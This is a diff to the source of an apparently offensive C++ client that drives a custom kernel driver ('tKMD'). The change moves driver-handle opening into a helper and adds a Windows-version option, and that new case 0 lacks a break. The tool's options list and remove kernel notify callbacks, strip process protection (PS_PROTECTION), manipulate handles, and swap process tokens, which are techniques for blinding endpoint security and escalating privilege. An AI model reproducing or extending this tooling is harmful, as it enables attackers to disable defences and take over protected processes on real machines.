@@ -5,30 +5,18 @@
 
 void PrintCallbackInfo(CALLBACK_INFO callbacks[]);
 OFFSET ValidateSupportedVersion(HANDLE hDriver);
+HANDLE attachToDriver();
 
 int main(int argc, char * argv[])
 {
-	HANDLE hDriver;
-	BOOL success; 
-	OFFSET offset;
-
-	hDriver = CreateFile(L"\\\\.\\tKMD", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
-
-	if (hDriver == INVALID_HANDLE_VALUE)
-	{
-		printf("[-] failed to open a handle to the driver: %d\n", GetLastError());
-		return 1;
-	}
-
-	WINDOWS_VERSION version;
-	if (success = DeviceIoControl(hDriver, IOCTL_WINDOWS_VERSION, nullptr, 0, &version, sizeof(version), nullptr, nullptr))
-	{
-		printf("Current Windows Version: %lu.%lu.%lu\n", version.MajorVersion, version.MinorVersion, version.BuildNumber);
-	}
+	BOOL success;
+	OFFSET offset; 
+	HANDLE hDriver; 
 
 	if (argc < 2)
 	{
 		printf("Usage: .exe <int:toggle>\n\t"
+			"0: (RING 0) PRINT CURRENT WINDOWS VERSION\n\t"
 			"1: (RING 0) LIST KERNEL MODULES\n\t" 
 			"2: (RING 0) LIST PROCESSNOTIFY CALLBACKS\n\t"
 			"3: (RING 0) LIST THREADNOTIFY CALLBACKS\n\t"
@@ -47,12 +35,23 @@ int main(int argc, char * argv[])
 
 	switch (toggle)
 	{
+		case 0: //READ CURRENT WINDOWS VERSION FROM KERNEL
+		{
+			hDriver = attachToDriver();
+			WINDOWS_VERSION version;
+
+			if (success = DeviceIoControl(hDriver, IOCTL_WINDOWS_VERSION, nullptr, 0, &version, sizeof(version), nullptr, nullptr))
+			{
+				printf("Current Windows Version: %lu.%lu.%lu\n", version.MajorVersion, version.MinorVersion, version.BuildNumber);
+			}
+		}
 		case 1: //LIST KERNEL MODULES
 		{
 			MODULE_NAMES modules[256];
 			int cDrivers = 0;
 			RtlZeroMemory(modules, sizeof(modules));
-		
+			hDriver = attachToDriver();
+
 			if (success = DeviceIoControl(hDriver, IOCTL_LIST_MODULES, nullptr, 0, &modules, sizeof(modules), nullptr, nullptr))
 			{
 				printf("[*] Listing all system modules...\n");
@@ -70,6 +69,7 @@ int main(int argc, char * argv[])
 		}
 		case 2: //LIST PROCESSNOTIFY CALLBACKS
 		{
+			hDriver = attachToDriver();
 			offset = ValidateSupportedVersion(hDriver);
 			if (offset.PROCESS_NOTIFY_OFFSET == 0x00)
 			{
@@ -86,6 +86,8 @@ int main(int argc, char * argv[])
 		}
 		case 3: // LIST THREADNOTIFY CALLBACKS
 		{
+			hDriver = attachToDriver();
+
 			offset = ValidateSupportedVersion(hDriver);
 			if (offset.THREAD_NOTIFY_OFFSET == 0x00)
 			{
@@ -102,6 +104,8 @@ int main(int argc, char * argv[])
 		}
 		case 4: //LIST IMAGENOTIFY CALLBACKS
 		{
+			hDriver = attachToDriver();
+
 			offset = ValidateSupportedVersion(hDriver);
 			if (offset.IMAGE_NOTIFY_OFFSET == 0x00)
 			{
@@ -124,6 +128,7 @@ int main(int argc, char * argv[])
 				exit(1);
 			}
 
+			hDriver = attachToDriver();
 			unsigned long long address = strtoull(argv[2], NULL, 16);
 		
 			PTARGET_CALLBACK target = new TARGET_CALLBACK{ address };
@@ -135,6 +140,7 @@ int main(int argc, char * argv[])
 		}
 		case 6: //REMOVE PS_PROTECTION			
 		{
+			hDriver = attachToDriver();
 			offset = ValidateSupportedVersion(hDriver);
 			if (offset.PS_PROTECTION_OFFSET == 0x00)
 			{
@@ -179,6 +185,7 @@ int main(int argc, char * argv[])
 				exit(1);
 			}
 
+			hDriver = attachToDriver();
 			int pid = std::atoi(argv[2]);
 			int handleID = std::stoi(argv[3], 0, 16);
 
@@ -209,6 +216,8 @@ int main(int argc, char * argv[])
 
 			int borrower = std::atoi(argv[2]);
 			int lender = std::atoi(argv[3]);
+
+			hDriver = attachToDriver();
 
 			PTOKENX tokens = new TOKENX{borrower, lender};
 			if (success = DeviceIoControl(hDriver, IOCTL_BORROW_TOKEN, tokens, sizeof(tokens), nullptr, 0, nullptr, nullptr))
@@ -243,4 +252,18 @@ OFFSET ValidateSupportedVersion(HANDLE hDriver)
 		exit(1);
 	}
 	return offset;
+}
+
+HANDLE attachToDriver()
+{
+	HANDLE hDriver;
+
+	hDriver = CreateFile(L"\\\\.\\tKMD", GENERIC_WRITE, FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, 0, nullptr);
+	if (hDriver == INVALID_HANDLE_VALUE)
+	{
+		printf("[-] failed to open a handle to the driver: %d\n", GetLastError());
+		exit(1);
+	}
+
+	return hDriver;
 }
